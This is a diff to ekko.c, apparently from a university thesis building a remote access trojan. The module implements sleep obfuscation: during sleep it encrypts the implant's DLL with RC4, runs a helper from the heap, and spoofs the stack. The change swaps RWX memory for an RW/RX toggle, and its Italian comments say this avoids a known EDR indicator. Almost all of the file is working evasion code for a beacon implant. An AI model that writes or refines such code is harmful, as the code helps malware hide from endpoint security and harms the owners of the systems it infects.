@@ -1,8 +1,10 @@
 /* ============================================================
  * ekko.c — Sleep Obfuscation (Heap-Copy + Stack Spoofing)
  *
- * APPROCCIO: sleep_helper() viene copiata su un buffer RWX in
- * heap ed eseguita da un thread separato.
+ * APPROCCIO: sleep_helper() viene copiata su un buffer heap
+ * (RW → RX) ed eseguita da un thread separato.
+ * Il DLL oscilla tra RX (esecuzione) e RW (sleep cifrato):
+ * non viene mai marcato RWX — IoC noto per gli EDR.
  *
  * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
  * ============================================================ */
@@ -24,12 +26,6 @@ typedef NTSTATUS (WINAPI *fnSysFunc032)(USTRING *, USTRING *);
 
 /* ----------------------------------------------------------
  * CET: definizioni per MinGW che non le ha
- * ---------------------------------------------------------- */
-#ifndef ProcessUserShadowStackPolicy
-# define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)7)
-#endif
-/* ----------------------------------------------------------
- * CET: enum value per MinGW < 10 che non lo ha
  * ---------------------------------------------------------- */
 #ifndef ProcessUserShadowStackPolicy
 # define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)7)
@@ -59,12 +55,12 @@ typedef struct {
  *   - tutte le chiamate tramite function pointer in ctx
  *   - nessun string literal
  *
- * Flusso:
+ * Flusso (RW ↔ RX toggle, mai RWX):
  *   1. VP(RW)       → DLL non-eseguibile
  *   2. RC4 encrypt  → DLL cifrato
  *   3. Sleep(dwMs)  → questo thread è in heap, non nel DLL
  *   4. RC4 decrypt  → DLL in chiaro
- *   5. VP(RWX)      → DLL eseguibile
+ *   5. VP(RX)       → DLL eseguibile (sola lettura)
  *   6. SetEvent     → beacon thread si risveglia
  * ---------------------------------------------------------- */
 __attribute__((noinline))
@@ -77,7 +73,7 @@ static DWORD WINAPI sleep_helper(LPVOID lpParam)
     c->fp_RC4(&c->encData, &c->encKey);
     c->fp_Sleep(c->dwMs);
     c->fp_RC4(&c->encData, &c->encKey);
-    c->fp_VP(c->dllBase, c->dllSize, PAGE_EXECUTE_READWRITE, &old);
+    c->fp_VP(c->dllBase, c->dllSize, PAGE_EXECUTE_READ, &old);
     /* Segnala al padre che il decrypt è completato (flag prima di SetEvent) */
     c->decrypted = 1;
     c->fp_SE(c->hDone);
@@ -214,10 +210,10 @@ void ekko_sleep(DWORD dwMs)
     SIZE_T dllSize = _own_size(dllBase);
     if (!dllBase || !dllSize) goto fallback;
 
-    /* ---- Fix 5: pre-normalizzazione a RWX ------------------ */
+    /* ---- Pre-normalizzazione a RX (mai RWX) --------------- */
     {
         DWORD _p = 0;
-        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READWRITE, &_p);
+        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READ, &_p);
     }
 
     /* ---- Dimensione di sleep_helper (con sanity check) ----- */
@@ -226,12 +222,17 @@ void ekko_sleep(DWORD dwMs)
     if (helper_size == 0 || helper_size > 4096)
         helper_size = 512;
 
-    /* ---- Copia sleep_helper su heap RWX ------------------- */
+    /* ---- Copia sleep_helper su heap (RW → RX, mai RWX) ---- */
     PVOID helper_copy = fp_VA(NULL, helper_size + 64,
                               MEM_COMMIT | MEM_RESERVE,
-                              PAGE_EXECUTE_READWRITE);
+                              PAGE_READWRITE);
     if (!helper_copy) goto fallback;
     memcpy(helper_copy, (PVOID)sleep_helper, helper_size);
+    /* Transizione RW → RX: il codice è ora eseguibile e non scrivibile */
+    {
+        DWORD _hp = 0;
+        fp_VP(helper_copy, helper_size + 64, PAGE_EXECUTE_READ, &_hp);
+    }
 
     /* ---- Alloca SLEEP_CTX su heap ------------------------- */
     SLEEP_CTX *ctx = (SLEEP_CTX *)fp_VA(NULL, sizeof(SLEEP_CTX),
@@ -312,7 +313,7 @@ void ekko_sleep(DWORD dwMs)
 
     if (wr != WAIT_OBJECT_0 && ctx->decrypted == 0) {
         /* Timeout reale: sleep_helper non ha ancora decifrato il DLL.
-         * Forziamo RW per scrivere, decifriamo, poi ripristiniamo RWX. */
+         * Forziamo RW per scrivere, decifriamo, poi ripristiniamo RX. */
         DWORD _rp0 = 0;
         _vprotect_range(dllBase, dllSize, PAGE_READWRITE, &_rp0);
         USTRING ed = { (ULONG)dllSize, (ULONG)dllSize, dllBase };
@@ -320,13 +321,13 @@ void ekko_sleep(DWORD dwMs)
         fp_RC4(&ed, &ek);
     }
 
-    /* ---- Fix 8: ripristina RWX su TUTTE le regioni dopo sleep ----------
+    /* ---- Ripristina RX (mai RWX) su TUTTE le regioni dopo sleep --------
      * sleep_helper usa una singola VirtualProtect che potrebbe coprire
      * solo la prima VAD entry. _vprotect_range itera su tutte le regioni.
      * Applicato sempre (sia WAIT_OBJECT_0 che timeout). */
     {
         DWORD _rp = 0;
-        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READWRITE, &_rp);
+        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READ, &_rp);
     }
 
     /* ---- Cleanup ------------------------------------------ */
